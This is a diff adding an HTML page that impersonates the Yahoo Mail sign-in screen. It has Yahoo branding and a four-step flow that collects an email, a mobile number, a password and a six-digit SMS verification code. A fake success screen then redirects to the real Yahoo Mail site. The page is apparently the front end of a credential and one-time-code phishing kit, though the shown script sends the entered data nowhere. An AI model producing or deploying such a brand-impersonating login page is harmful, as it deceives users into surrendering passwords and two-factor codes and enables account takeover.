@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Yahoo Mail - Sign in</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'Helvetica Neue', Arial, sans-serif; background: #fff; min-height: 100vh; display: flex; flex-direction: column; }
+    header { background: #6001d2; padding: 0 24px; display: flex; align-items: center; height: 56px; gap: 16px; }
+    .yahoo-logo { display: flex; align-items: center; text-decoration: none; }
+    .ynav { display: flex; margin-left: auto; gap: 4px; }
+    .ynav a { color: rgba(255,255,255,.85); font-size: 13px; padding: 6px 12px; border-radius: 4px; text-decoration: none; }
+    .ynav a:hover { background: rgba(255,255,255,.1); color: #fff; }
+    .page { flex: 1; display: flex; }
+    .left-panel { flex: 1; background: linear-gradient(160deg, #6001d2 0%, #4a00a8 60%, #3a0080 100%); display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 60px 40px; color: #fff; }
+    .left-panel h2 { font-size: 32px; font-weight: 700; margin-bottom: 16px; text-align: center; }
+    .left-panel p { font-size: 16px; opacity: .85; text-align: center; max-width: 320px; line-height: 1.6; margin-bottom: 32px; }
+    .feature-list { list-style: none; display: flex; flex-direction: column; gap: 14px; width: 100%; max-width: 300px; }
+    .feature-list li { display: flex; align-items: center; gap: 12px; font-size: 14px; opacity: .9; }
+    .feat-icon { width: 32px; height: 32px; background: rgba(255,255,255,.15); border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-size: 15px; }
+    .right-panel { width: 440px; display: flex; flex-direction: column; justify-content: center; padding: 48px 48px 32px; background: #fff; }
+    .step { display: none; }
+    .step.active { display: block; }
+    h1 { font-size: 24px; font-weight: 700; color: #1d1d1d; margin-bottom: 6px; }
+    .sub { font-size: 14px; color: #555; margin-bottom: 28px; line-height: 1.5; }
+    .sub a { color: #6001d2; text-decoration: none; font-weight: 600; }
+    .sub a:hover { text-decoration: underline; }
+    .fg { margin-bottom: 20px; }
+    .fg label { display: block; font-size: 13px; font-weight: 700; color: #1d1d1d; margin-bottom: 6px; letter-spacing: .2px; }
+    .fg input { width: 100%; padding: 12px 14px; border: 1.5px solid #bbb; border-radius: 4px; font-size: 15px; color: #1d1d1d; outline: none; transition: border-color .15s; background: #fff; }
+    .fg input:focus { border-color: #6001d2; box-shadow: 0 0 0 3px rgba(96,1,210,.1); }
+    .fg-err { font-size: 12px; color: #c0003a; margin-top: 6px; display: none; }
+    .fg-err.show { display: block; }
+    .pwd-wrap { position: relative; }
+    .show-pwd { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; color: #6001d2; font-size: 13px; font-weight: 700; cursor: pointer; }
+    .forgot { font-size: 13px; color: #6001d2; text-decoration: none; font-weight: 600; display: block; margin-bottom: 24px; }
+    .forgot:hover { text-decoration: underline; }
+    .stay { display: flex; align-items: center; gap: 8px; font-size: 13px; color: #555; margin-bottom: 24px; }
+    .stay input { width: 16px; height: 16px; accent-color: #6001d2; }
+    .btn { width: 100%; padding: 13px; background: #6001d2; color: #fff; font-size: 16px; font-weight: 700; border: none; border-radius: 100px; cursor: pointer; transition: background .15s; margin-bottom: 16px; }
+    .btn:hover { background: #4a00a8; }
+    .btn-back { width: 100%; padding: 13px; background: transparent; color: #6001d2; font-size: 15px; font-weight: 700; border: 1.5px solid #6001d2; border-radius: 100px; cursor: pointer; transition: background .15s; margin-bottom: 16px; }
+    .btn-back:hover { background: rgba(96,1,210,.05); }
+    .divider { display: flex; align-items: center; gap: 12px; margin: 4px 0 16px; font-size: 12px; color: #888; }
+    .divider::before, .divider::after { content: ''; flex: 1; border-top: 1px solid #e0e0e0; }
+    .user-chip { display: flex; align-items: center; gap: 10px; background: #f5f0ff; border: 1px solid #d8c7f5; border-radius: 100px; padding: 6px 14px 6px 6px; margin-bottom: 24px; width: fit-content; }
+    .avatar { width: 32px; height: 32px; border-radius: 50%; background: #6001d2; color: #fff; font-size: 15px; font-weight: 700; display: flex; align-items: center; justify-content: center; }
+    .user-email-chip { font-size: 14px; color: #1d1d1d; font-weight: 500; }
+    /* SMS verify step */
+    .sms-info { background: #f5f0ff; border: 1px solid #d8c7f5; border-left: 4px solid #6001d2; border-radius: 4px; padding: 14px 16px; margin-bottom: 22px; font-size: 13px; color: #3a0080; line-height: 1.6; }
+    .sms-info strong { display: block; font-size: 14px; margin-bottom: 4px; }
+    .otp-boxes { display: flex; gap: 10px; margin-bottom: 8px; }
+    .otp-boxes input { width: 46px; height: 54px; text-align: center; font-size: 22px; font-weight: 700; border: 1.5px solid #bbb; border-radius: 8px; outline: none; color: #1d1d1d; background: #fff; }
+    .otp-boxes input:focus { border-color: #6001d2; box-shadow: 0 0 0 3px rgba(96,1,210,.1); }
+    .resend { font-size: 13px; color: #555; margin-bottom: 22px; }
+    .resend a { color: #6001d2; text-decoration: none; font-weight: 600; }
+    .resend a:hover { text-decoration: underline; }
+    /* Granted */
+    .granted { text-align: center; padding: 10px 0; }
+    .y-check { width: 68px; height: 68px; background: #6001d2; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; animation: pop .4s ease; }
+    @keyframes pop { 0%{transform:scale(.4);opacity:0} 80%{transform:scale(1.1)} 100%{transform:scale(1);opacity:1} }
+    .granted h2 { font-size: 22px; font-weight: 700; color: #1d1d1d; margin-bottom: 8px; }
+    .granted p { font-size: 14px; color: #555; line-height: 1.6; margin-bottom: 6px; }
+    .redir { margin-top: 20px; background: #f5f0ff; border: 1px solid #d8c7f5; border-radius: 8px; padding: 14px 16px; font-size: 13px; color: #4a00a8; text-align: left; }
+    .redir strong { display: block; font-size: 14px; margin-bottom: 4px; }
+    .prog-track { margin-top: 10px; height: 4px; background: #d8c7f5; border-radius: 2px; overflow: hidden; }
+    .prog-fill { height: 100%; width: 0%; background: #6001d2; }
+    footer { background: #f5f5f5; border-top: 1px solid #e8e8e8; padding: 14px 32px; display: flex; justify-content: center; flex-wrap: wrap; gap: 4px 20px; }
+    footer a { font-size: 11px; color: #777; text-decoration: none; }
+    footer a:hover { text-decoration: underline; }
+    footer span { font-size: 11px; color: #aaa; }
+    @media (max-width: 760px) { .left-panel { display: none; } .right-panel { width: 100%; padding: 40px 24px 28px; } }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="yahoo-logo">
+    <svg width="100" height="32" viewBox="0 0 100 32" xmlns="http://www.w3.org/2000/svg">
+      <text y="26" font-size="28" font-weight="900" font-family="Arial Black, Arial, sans-serif" fill="white" letter-spacing="-1">Yahoo!</text>
+    </svg>
+  </div>
+  <nav class="ynav">
+    <a href="#">Mail</a>
+    <a href="#">News</a>
+    <a href="#">Finance</a>
+    <a href="#">Sports</a>
+  </nav>
+</header>
+
+<div class="page">
+  <div class="left-panel">
+    <h2>Your world, all in one place</h2>
+    <p>Sign in to access your Yahoo Mail, news, finance and more.</p>
+    <ul class="feature-list">
+      <li><div class="feat-icon">&#9993;</div> 1 TB of mail storage</li>
+      <li><div class="feat-icon">&#128274;</div> Advanced spam protection</li>
+      <li><div class="feat-icon">&#9889;</div> Instant notifications</li>
+      <li><div class="feat-icon">&#128247;</div> Manage Yahoo+ subscription</li>
+    </ul>
+  </div>
+
+  <div class="right-panel">
+
+    <!-- STEP 1: Email -->
+    <div class="step active" id="step1">
+      <h1>Sign in</h1>
+      <p class="sub">to continue to Yahoo Mail &mdash; <a href="#">Create account</a></p>
+      <div class="fg">
+        <label for="email">Email address or phone number</label>
+        <input type="email" id="email" autocomplete="email" placeholder="you@yahoo.com" />
+        <p class="fg-err" id="email-err">Please enter a valid email or phone number.</p>
+      </div>
+      <div class="fg">
+        <label for="y-mobile">Mobile number (for verification)</label>
+        <input type="tel" id="y-mobile" autocomplete="tel" placeholder="e.g. 07700 900000" />
+        <p class="hint">Used to send you a verification code in step 3.</p>
+      </div>
+      <button class="btn" onclick="nextStep()">Next</button>
+      <div class="divider">or</div>
+      <p style="font-size:13px;color:#555;text-align:center;">
+        <a href="#" style="color:#6001d2;font-weight:600;text-decoration:none;">Sign in with Google</a>
+        &nbsp;&middot;&nbsp;
+        <a href="#" style="color:#6001d2;font-weight:600;text-decoration:none;">Sign in with Apple</a>
+      </p>
+    </div>
+
+    <!-- STEP 2: Password -->
+    <div class="step" id="step2">
+      <h1>Enter your password</h1>
+      <div class="user-chip">
+        <div class="avatar" id="av">?</div>
+        <span class="user-email-chip" id="disp-email"></span>
+      </div>
+      <div class="fg">
+        <label for="pwd">Password</label>
+        <div class="pwd-wrap">
+          <input type="password" id="pwd" autocomplete="current-password" placeholder="Password" />
+          <button class="show-pwd" type="button" onclick="togglePwd(this)">Show</button>
+        </div>
+        <p class="fg-err" id="pwd-err">Invalid password. Please try again.</p>
+      </div>
+      <a href="#" class="forgot">Forgot password?</a>
+      <label class="stay"><input type="checkbox" checked /> Stay signed in</label>
+      <button class="btn" onclick="doPassword()">Sign in</button>
+      <button class="btn-back" onclick="showStep(1)">Back</button>
+    </div>
+
+    <!-- STEP 3: SMS OTP -->
+    <div class="step" id="step3">
+      <h1>Verify it&rsquo;s you</h1>
+      <p class="sub">Complete this extra step to keep your account safe.</p>
+      <div class="sms-info">
+        <strong>We sent a verification code to your phone</strong>
+        A 6-digit code has been sent via SMS to the number ending in <strong id="y-mobile-hint"></strong>. Enter it below to continue.
+      </div>
+      <div class="fg">
+        <label>Enter 6-digit code</label>
+        <div class="otp-boxes">
+          <input type="text" maxlength="1" class="y-otp" inputmode="numeric" />
+          <input type="text" maxlength="1" class="y-otp" inputmode="numeric" />
+          <input type="text" maxlength="1" class="y-otp" inputmode="numeric" />
+          <input type="text" maxlength="1" class="y-otp" inputmode="numeric" />
+          <input type="text" maxlength="1" class="y-otp" inputmode="numeric" />
+          <input type="text" maxlength="1" class="y-otp" inputmode="numeric" />
+        </div>
+      </div>
+      <p class="resend">Didn't get a code? <a href="#" onclick="return false;">Resend SMS</a> &nbsp;&middot;&nbsp; <a href="#" onclick="return false;">Try another way</a></p>
+      <button class="btn" onclick="doVerify()">Verify</button>
+      <button class="btn-back" onclick="showStep(2)">Back</button>
+    </div>
+
+    <!-- STEP 4: Granted -->
+    <div class="step" id="step4">
+      <div class="granted">
+        <div class="y-check">
+          <svg width="36" height="36" viewBox="0 0 36 36" fill="none">
+            <path d="M7 18l8 8 14-14" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </div>
+        <h2>You&rsquo;re signed in!</h2>
+        <p>Welcome back to Yahoo Mail.</p>
+        <div class="redir">
+          <strong id="ctxt">Redirecting in 5 seconds</strong>
+          You will be taken to your Yahoo Mail inbox.
+          <div class="prog-track"><div class="prog-fill" id="pfill"></div></div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<footer>
+  <a href="#">Help</a>
+  <a href="#">Privacy</a>
+  <a href="#">Terms</a>
+  <a href="#">About us</a>
+  <a href="#">Advertise</a>
+  <span>&copy; 2024 Yahoo! All rights reserved.</span>
+</footer>
+
+<script>
+  function nextStep() {
+    var em = document.getElementById('email').value.trim();
+    if (!em || (!em.includes('@') && !/^[0-9+]{7,}$/.test(em))) {
+      document.getElementById('email-err').classList.add('show'); return;
+    }
+    document.getElementById('email-err').classList.remove('show');
+    document.getElementById('av').textContent = em.charAt(0).toUpperCase();
+    document.getElementById('disp-email').textContent = em;
+    showStep(2);
+  }
+  function doPassword() {
+    var pw = document.getElementById('pwd').value;
+    if (!pw) { document.getElementById('pwd-err').classList.add('show'); return; }
+    document.getElementById('pwd-err').classList.remove('show');
+    var raw = document.getElementById('y-mobile').value.replace(/\s/g, '');
+    var hint = raw.length >= 2 ? '●●●●' + raw.slice(-2) : (raw || '●●●●??');
+    document.getElementById('y-mobile-hint').textContent = hint;
+    showStep(3);
+  }
+  function doVerify() { showStep(4); startRedirect(); }
+  function showStep(n) {
+    document.querySelectorAll('.step').forEach(function(s){ s.classList.remove('active'); });
+    document.getElementById('step'+n).classList.add('active');
+  }
+  function togglePwd(btn) {
+    var inp = document.getElementById('pwd');
+    if(inp.type==='password'){inp.type='text';btn.textContent='Hide';}
+    else{inp.type='password';btn.textContent='Show';}
+  }
+  function startRedirect() {
+    var s=5, fill=document.getElementById('pfill'), txt=document.getElementById('ctxt');
+    fill.style.transition='width '+s+'s linear';
+    setTimeout(function(){ fill.style.width='100%'; },50);
+    var iv=setInterval(function(){
+      s--;
+      if(s<=0){clearInterval(iv);txt.textContent='Redirecting now...';setTimeout(function(){window.location.href='https://mail.yahoo.com';},400);}
+      else txt.textContent='Redirecting in '+s+' second'+(s!==1?'s':'');
+    },1000);
+  }
+  var yOtp = document.querySelectorAll('.y-otp');
+  yOtp.forEach(function(inp,i){
+    inp.addEventListener('input',function(){
+      this.value=this.value.replace(/[^0-9]/g,'');
+      if(this.value&&i<yOtp.length-1) yOtp[i+1].focus();
+    });
+    inp.addEventListener('keydown',function(e){
+      if(e.key==='Backspace'&&!this.value&&i>0) yOtp[i-1].focus();
+    });
+  });
+  document.getElementById('email').addEventListener('keydown',function(e){if(e.key==='Enter')nextStep();});
+  document.getElementById('pwd').addEventListener('keydown',function(e){if(e.key==='Enter')doPassword();});
+</script>
+</body>
+</html>
